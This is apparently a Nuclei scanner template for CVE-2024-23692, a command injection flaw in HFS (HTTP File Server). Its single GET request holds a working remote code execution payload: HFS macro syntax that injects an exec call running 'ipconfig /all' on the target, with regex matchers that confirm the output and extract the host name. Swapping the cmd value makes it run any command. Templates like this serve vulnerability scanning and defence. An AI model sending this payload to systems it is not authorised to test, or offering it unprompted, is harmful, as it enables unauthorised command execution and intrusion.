id: CVE-2024-23692

info:
  name: HFS Command Injection RCE
  author: johnk3r
  severity: critical
  tags: rce,hfs,cve

requests:
  - method: GET
    path:
      - "{{BaseURL}}/?n=%0A&cmd=ipconfig+/all&search=%25xxx%25url%25:%password%}{.exec|{.?cmd.}|timeout=15|out=abc.}{.?n.}{.?n.}RESULT:{.?n.}{.^abc.}===={.?n.}"

    matchers:
      - type: regex
        part: body
        regex:
          - "Windows IP Configuration"
          - "Host Name"

    extractors:
      - type: regex
        part: body
        regex:
          - "Host Name .+ : ([^\r\n]+)"
